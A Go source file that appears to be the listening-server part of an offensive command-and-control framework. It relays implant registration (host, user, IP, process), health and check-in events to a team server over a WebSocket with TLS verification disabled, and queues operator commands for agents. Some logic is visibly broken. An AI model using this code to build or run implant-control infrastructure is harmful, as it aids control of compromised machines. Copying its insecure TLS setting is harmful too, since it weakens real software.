package ListeningServer

import (
	"AllSecure/ListeningServer/Common"
	"crypto/tls"
	"encoding/json"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"strings"
)

func CreateWebSocketConnection() (*websocket.Conn, error) {

	var (
		token   []byte
		err     error
		headers http.Header
	)

	endpoint := "wss://" + g_clientobj.Server + "/ws"
	token, err = json.Marshal(g_clientobj.Cookie.Token.JwtToken)
	if err != nil {
		log.Println("[error] attempting to marshal JWT token")
		return nil, err
	}
	//set our request authorization header to be our jwt  token.
	headers = make(http.Header)
	headers.Set("Authorization", strings.Trim(string(token), "\""))
	websocket.DefaultDialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	conn, _, err := websocket.DefaultDialer.Dial(endpoint, headers)
	if err != nil {
		log.Println("[error] attempting to make websocket connection", err)
		return nil, err
	}

	return conn, nil
}

func StartEventHandler(token string, teamserver string) error {
	var (
		err  error
		conn *websocket.Conn
	)
	g_clientobj.Cookie.Token.JwtToken = token
	g_clientobj.Server = teamserver
	conn, err = CreateWebSocketConnection()
	if err != nil {
		log.Println("[error] attempting to create websocket connection", err)
		return err
	}

	g_clientobj.Conn = Common.NewSafeWebSocket(conn)

	go RecvEvent()

	return nil
}

func SendEvent(EventName string, ImpCtx Common.ImplantContext, Alive bool, Data interface{}) error {
	var NewMessage Common.NewWebSocketMessage
	var err error
	var NewImplant Common.ImplantData
	var TempData []byte

	switch EventName {
	case "RegisterImplant":

		NewMessage.MessageType = "RegisterImplant"
		NewImplant.ImplantId = ImpCtx.Agent_id
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.Computer = ImpCtx.Host_name
		NewImplant.InternalIP = ImpCtx.Ip_addr
		NewImplant.ExternalIP = ImpCtx.Ip_addr
		NewImplant.User = ImpCtx.User_name
		NewImplant.Health = Alive
		NewImplant.OS = Common.GetWindowsVersion(ImpCtx.Os_info)
		NewImplant.Process = ImpCtx.Process_name
		NewImplant.PID = ImpCtx.Process_id
		NewImplant.LastCheckIn = ImpCtx.LastCheckin.String()
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}
		NewMessage.Message = string(TempData)
		err = g_clientobj.Conn.WriteJSON(NewMessage)
		if err != nil {
			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
			return err
		}

		break

	case "UpdateHealth":
		NewMessage.MessageType = "UpdateHealth"
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.Health = Alive
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}
		NewMessage.Message = string(TempData)
		err = g_clientobj.Conn.WriteJSON(NewMessage)
		if err != nil {
			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
		}
		break

	case "UpdateCheckin":
		NewMessage.MessageType = "UpdateCheckin"
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.LastCheckIn = ImpCtx.LastCheckin.String()
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}
		NewMessage.Message = string(TempData)
		err = g_clientobj.Conn.WriteJSON(NewMessage)
		if err != nil {
			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
		}
		break

	case "SendModuleData":
		//TODO FIX THIS IT DOES NOT WORK. maybe just send the module data as a byte array and let the client handle it.
		var (
			ModuleData       map[string][]byte
			ModuleBinaryData []byte
			ok               bool
		)

		NewMessage.MessageType = "SendModuleData"
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.LastCheckIn = ImpCtx.LastCheckin.String()
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}
		if ModuleData, ok = Data.(map[string][]byte); !ok {
			log.Println("[error] attempting to cast module data to map[string][]byte")
			return err
		}
		ModuleBinaryData, err = json.Marshal(ModuleData)

		TempData = append(TempData, ModuleBinaryData...)
		err = g_clientobj.Conn.WriteBinary(TempData)
		if err != nil {
			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
		}
		break

	default:
		break
	}
	return nil
}

func RecvEvent() {
	var (
		NewWSMessage Common.NewWebSocketMessage
		err          error
	)
	for {
		err = g_clientobj.Conn.ReadJSON(&NewWSMessage)
		if err != nil {
			log.Println("[error] attempting to read web socket message ", err)
			continue
		}
		switch NewWSMessage.MessageType {

		case "GetActiveImplants":
			if len(agent_map) > 0 {
				for _, agent := range agent_map {
					//we don't care if the agent is alive or dead. We just want to know which agents are registered until agent is dead by manual killing or kill-date has been reached.
					err = SendEvent("RegisterImplant", agent.Context, agent.Alive, nil)
					if err != nil {
						log.Println("[error] attempting to send implant data to the team server web socket connection", err)
						continue
					}
				}
			}

			break // GET ACTIVE IMPLANTS

		case "ImplantCommand":
			var ImplantCmd Common.ImplantCommandData
			var AgentCmd Common.AgentCmd
			var DataBuf []byte

			for _, str := range ImplantCmd.Args {
				DataBuf = append(DataBuf, []byte(str+" ")...)
			}

			err = json.Unmarshal([]byte(NewWSMessage.Message), &ImplantCmd)
			if err != nil {
				log.Println("[error] attempting to unmarshal the implant command data", err)
				continue
			}
			switch ImplantCmd.Command {
			case "lm":
				AgentCmd.CmdID = Common.CMD_LIST_MODULES
				AgentCmd.RequestID = 69
				AgentCmd.DataBuffer = DataBuf
				break

			default:
				break
			}

			agent := agent_map[ImplantCmd.ImplantName]
			log.Println("[info] attempting to send command [", ImplantCmd.Command, "] to agent [", agent.Context.Agent_name, "]")
			agent.CmdQue.Enqueue(AgentCmd)

			break // IMPLANT COMMAND

		default:
			break // DEFAULT
		}
	}
}
